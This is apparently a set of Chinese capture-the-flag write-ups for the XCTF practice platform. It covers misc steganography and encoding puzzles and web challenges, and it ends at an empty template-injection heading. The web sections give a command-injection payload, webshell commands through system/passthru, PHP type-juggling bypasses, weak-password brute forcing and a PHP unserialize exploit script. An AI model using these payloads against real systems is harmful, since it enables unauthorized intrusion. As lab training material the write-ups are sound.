# 攻防世界

## misc初级

### this is flag

提交flag{th1s_!s_a_d4m0_4la9}即可

### pdf

做法1：pdf转word后看到答案

在线转换地址https://app.xunjiepdf.com/pdf2word/

做法2：chrome打开pdf，直接ctrl+f搜索flag

### give_you_flag

正常打开gif，发现最后有一个二维码

用ps打开gif，找到那一帧，找到对应二维码

二维码需要四个角中三个角添加定位方块，用ps添加定位方块后，随便一个二维码扫描工具得到flag

### 坚持60s

得到jar文件，可以用压缩包软件打开文件还原出工程

使用idea打开工程，在爆炸文件下得到明文flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}

提交后显示flag错误，使用base64对flag中内容解码得到但

```
flag{DajiDali_JinwanChiji}
```

### gif

得到104张黑白图片

使用python读取文件，白为0黑为1，得到一个字符串

```
white = open("./0.jpg","rb").read()
black = open("./1.jpg","rb").read()

flag_dic = ""
for i in range(104):
	with open("./%d.jpg"%i,"rb") as f:
		if f.read() == white:
			flag_dic += "0"
		else:
			flag_dic += "1"
print(flag_dic)

01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101
```

使用在线的二进制转字符串工具得到答案

```
flag{FuN_giF}
```

### 掀桌子

最大字符不超过f，判断为十六进制

将两个连续数字设为一个字节，代表一个符号。所有字节大于128，而ASCII码表均小于128，故均减去128

得到flag

```
str = "c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"
count = 0
tempstr = ""
ans = ""
for s in str:
	tempstr += s
	if len(tempstr) == 2:
		ans += chr(int(tempstr, 16) - 128)
		# print(int(tempstr, 16))
		tempstr = ""
print(ans)

Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr
```

### 如来十三掌

使用与佛论禅论坛，http://keyfc.net/bbs/tools/tudoucode.aspx，对文字进行解密得到

```
MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9
```

根据题目提示，使用ROT13编码进行解密

```
ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9
```

再使用base64进行编码，得到flag

```
flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}
```

### stegano

工具：福昕pdf编辑器

思路：从pdf文件中找到字符，再进行加解密

去除无用信息后，选中“编辑对象”，框选一大片区域，发现字符串

```
BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB
```

类似于培根密码，但培根密码为5位一组，不符合。此字符串中只有AB两种字符，类似于二进制，联想摩斯密码，解密后得到flag

```
flag{1nv151bl3m3554g3}
```

#### 培根密码

采用a和b两种字符表示的字符串，5位字符一组

#### 摩斯密码

### simpleRAR

工具：winhex，stegsolve（图片隐写工具），photoshop

首先下载得到一个rar文件，打开后提示“secure.png"文件头损坏。

尝试使用winrar直接修复，结果是把secure.png直接删除。尝试失败。

上网查阅rar块构成后，将“Cflag is not here?”后十六进制的7A更改为74。成功解压得到secure.png

根据题目提示，将png放入photoshop中。photoshop提示非png文件。

使用winhex打开secure.png，头部标识

```
474946
```

表示这是一个gif文件。更改后缀名后放入photoshop中，得到两个图层。

分别将两个图层的空白图片放入stegsolve，得到二维码。放入photoshop合成二维码并补充三个角，扫码后得到flag

```
flag{yanji4n_bu_we1shi}
```

#### rar头部构成

每个数据块结构

```
HEAD_CRC：校验码，2字节
HEAD_TYPE：块类型，1字节
HEAD_FLAGS：块标记，2字节
最后两字节：块大小
```

整个RAR文件数据块构成

```
标记块：HEAD_TYPE=0x72
压缩文件头：HEAD_TYPE=0x74
文件头：HEAD_TYPE=0x74
```

### base64stego

工具：winhex

知识点：zip伪加密，base64隐写

首先要用winhex，修改zip的压缩源文件数据区全局加密处的字节

得到一个文件stego.txt。结合题目提示，对其进行base64解码，并未得到期望的结果。

查阅wp可知考察base64隐写。base64隐写不等于base64解码

```
import base64
import msvcrt
import time
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('stego.txt', 'rb') as f:
    bin_str = ''
    for line in f.readlines():
        # 去除头尾的换行符
        stegb64 = str(line, "utf-8").strip("\n")
        # 基于base64解码又编码，达到去除隐写的符号的目的
        row64 = str(base64.b64encode(base64.b64decode(stegb64)),"utf-8")
        # 基于base64的隐写，都在最后一个字符上体现。因此算一下两个字符串最后一个字符的差值
        offset = abs(b64chars.index(stegb64.replace('=','')[-1]) - b64chars.index(row64.replace('=','')[-1]))
        print(offset)
        #print(stegb64.replace('=',''))
        #print(stegb64.replace('=','')[-1])
        #print(b64chars.index(stegb64.replace('=','')[-1]))
        #print(b64chars.index(row64.replace('=','')[-1]))
        # 等号的数量*2等于最后返回字符串的长度
        equalnum = stegb64.count('=')
        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)
        print(bin(offset))
        print(bin(offset)[2:])
        # 右对齐后，在头部填充0
        print(bin(offset)[2:].zfill(equalnum * 2))
        # 8个bit转换为一个字符
        print(''.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)]))
        # time.sleep(3)

```



#### zip的伪加密

zip由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志，根据三个区域的不同，区分zip是非加密、伪加密还是加密的。

```
压缩源文件数据区： 
50 4B 03 04：这是头文件标记（0x04034b50） 
14 00：解压文件所需 pkware 版本 
00 00：全局方式位标记（有无加密） 头文件标记后2bytes
08 00：压缩方式 
5A 7E：最后修改文件时间 
F7 46：最后修改文件日期 
16 B5 80 14：CRC-32校验（1480B516） 
19 00 00 00：压缩后尺寸（25） 
17 00 00 00：未压缩尺寸（23） 
07 00：文件名长度 
00 00：扩展记录长度 
6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 
压缩源文件目录区： 

50 4B 01 02：目录中文件文件头标记(0x02014b50) 

3F 00：压缩使用的 pkware 版本

14 00：解压文件所需 pkware 版本 
00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes
08 00：压缩方式 
5A 7E：最后修改文件时间 
F7 46：最后修改文件日期 
16 B5 80 14：CRC-32校验（1480B516） 
19 00 00 00：压缩后尺寸（25） 
17 00 00 00：未压缩尺寸（23） 
07 00：文件名长度 
24 00：扩展字段长度 
00 00：文件注释长度 
00 00：磁盘开始号 
00 00：内部文件属性 
20 00 00 00：外部文件属性 

00 00 00 00：局部头部偏移量

6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 
压缩源文件目录结束标志： 
50 4B 05 06：目录结束标记 
00 00：当前磁盘编号 
00 00：目录区开始磁盘编号 
01 00：本磁盘上纪录总数 
01 00：目录区中纪录总数 
59 00 00 00：目录区尺寸大小 

3E 00 00 00：目录区对第一张磁盘的偏移量

00 00：ZIP 文件注释长度
```

```
无加密
压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）
且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）

假加密
压缩源文件数据区的全局加密应当为00 00 
且压缩源文件目录区的全局方式位标记应当为09 00

真加密
压缩源文件数据区的全局加密应当为09 00 
且压缩源文件目录区的全局方式位标记应当为09 00 
```

#### base64编码

原本一个字符使用8bit表示，使用base64编码后改为用6bit表示，不能除尽的部分补0

#### base64解码

```
检查base64编码后面有几个等于号
把字符串按照base64表转换成4*6的倍数位数二进制
删除等于号的个数*8的bit
按照6个bit一组转成字符
```

#### base64隐写

```
基于base64解码时尾部存在一定数量的bit不会被转义的情况，可以在此处植入想要隐写的字符
```

### ext3

这题没看题解自己做的，感动哭了

首先根据提示，这是一个linux系统光盘文件。放入centos中，使用file命令查看

```
file f1fc23f5c743425d9e0073887c846d23

Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)
```

网上查阅如何使用ext3文件系统数据，使用mount命令挂载。注意要在root用户权限下使用

```
mount -o loop f1fc23f5c743425d9e0073887c846d23 /mnt
# -o loop提供了一个虚拟磁盘，/mnt是挂载的目录
```

进入/mnt，随便搜搜flag相关字，发现在flag.txt

```
./O7avZhikgKgbF/flag.txt
```

查看flag.txt中的内容，根据字符串其后的等号判断为base64。解码后得到答案

```
flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}
```

网上还有一种用winhex的做法

## web 初级

### view_souce

按F12，看到注释源码

```
cyberpeace{ffd40408d5b1b8c2dad9aab623dd93ef}
```

### robots

先用御剑或者dirsearch扫描一下给出的网站

得到目录下存在robots.txt文件

访问该文件，网页展示内容

```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```

访问f1ag_1s_h3re.php

```
cyberpeace{57752958f46d76651078942ee34b88ba}
```

### backup

同理，用御剑扫一下后台，存在index.php.bak文件

访问这个文件，自动下载文件

使用sublime text打开文件，得到flag

```
Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}
```

### cookie

所需工具：firefox

可选工具：burp，wireshark

先打开网页，根据题目提示，在firefox按F12查看cookie

根据提示访问cookie.php

根据提示查看http response，得到flag

```
cyberpeace{5c1980e2f03a088816f306f7680d5458}
```

### disabled_button

工具：firefox

打开网页，显示按钮不能按

使用firefox，按F12检查网页源码，把button处的disabled去掉，即可提交

提交后得到flag

```
cyberpeace{a8efb264c88f7cba483ed431888a1d32}
```

### weak_auth

目的：爆破弱密码

工具：burp

proxy拦截提交的请求，将请求send to intruder，在intruder的position中更改数据包，使得提交的指定字段为变量，在intruder的payload中载入字典，点击attack

```
cyberpeace{4b4dda09ed661c8976f965b0681de325}
```

### command execution

输入localhost，看到请求为

```
target:"127.0.0.1"
```

尝试注入语句

```
" select database(); #
```

得到请求为

```
target:"+select+database();+#
```

说明不能注入

参考writeup，直接在命令行执行的ping，可以执行其他语句。又flag一般放在txt中，输入下列语句

```
127.0.0.1 && find / -name "*.txt" | grep flag
```

看到/home/flag.txt

查看文件内容得到flag

```
cyberpeace{168a646a5815f5b2f0e42e56812943d5}
```

### simple_php

需要知识点：php的弱类型比较

需要工具：直接在浏览器提交就行

```
写法1：?a='0'&b=1235a # 使a为字符串，b为非数字的一种变量
写法2：?a=0a&b=12345%00 # %00表示阶段，可以使b不为数字或数字字符串
```



#### php的弱类型比较

php有两种判断相等的方法，==，===

==会将两边值进行强制类型转换后在判断

===同时判断类型和值

```
if("admin"==0) //true
if("1admin"==1)//true
if("admin1"==1)//false
if("0e12324"=="0e1324")//true，当做科学技术法，都是0
```

### get_post

工具：firefox的hackbar插件

```
cyberpeace{f5206ff77800e22928b4d81206e083e5}
```

### xff_referer

工具：burpsuite

在burp的proxy里，把包拦下来，按照提示加入这两条就行

```
X-Forwarded-For: 123.123.123.123
Referer: https://www.google.com
```

得到答案

```
cyberpeace{2db9b3a38c581792bea6f015e6bdfdc8}
```

#### XFF和Referer

X-Forwarded-For：浏览器访问服务器时，使用的IP

Referer：浏览器告诉服务器，自己从哪个IP跳转来的

### web_shell

考察：php一句话木马，php执行shell命令

工具：中国蚁剑，中国菜刀，hackbar

做法1：中国蚁剑or中国菜刀

菜刀可以绕过认证部分，直接拿到webshell权限，之后查找flag即可

做法2：hackbar

在post data中写入 以下语句

首先查找当前目录文件

```
shell=system("ls")
```

写入以下任意一句

```
shell=passthru("cat flag.txt");
shell=system("cat flag.txt")
```

#### php执行shell命令

```
string system ( string $command [, int &$return_var ] )
string exec ( string $command [, array &$output [, int &$return_var ]] )
void passthru ( string $command [, int &$return_var ] )
```

### simple_js

考察：js阅读，转码

阅读js源码，发现dechiffre不管输入什么，都会根据

```
70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65
```

返回一个值。ASCII码范围为0~127，猜测这几个值为字符的ASCII码表示

代码里有一段十六进制的长字符串，猜测为答案

先把长字符串转换为十进制，再转换为字符，得到答案

```
Cyberpeace{786OsErtk12}
```

## web 高级

### baby_web

工具：firefox

看一下返回的响应头，就看到flag

```
flag{very_baby_web}
```

### Training-WWW-Robots

打开网页，根据提示在url输入/robots.txt

```
User-agent: *
Disallow: /fl0g.php


User-agent: Yandex
Disallow: *
```

在url输入/fl0g.php，得到flag

```
cyberpeace{04a3b25a4981849593d0b45e6f3b2717}
```

### Web_php_unserialize

根据网页上显示的源码，需要在url的var中传入一个参数，这个参数首先会被base64解码，然后查看是否pre_match一个正则，最后被序列化

因此，需要把Demo中的file变量设置成“fl4g.php”，并且需要依次进行序列化，pre_match的绕过，base64编码

```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
    var_dump($C);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($C));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
?>
```

```
$flag="ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}"
```



#### php的var_dump

输出变量信息

#### php的class

```
__construct：初始化一个对象时执行
__destruct：对象销毁时执行
__wakeup：对象被反序列化时执行
```

### Web_python_template_injection

#### flask

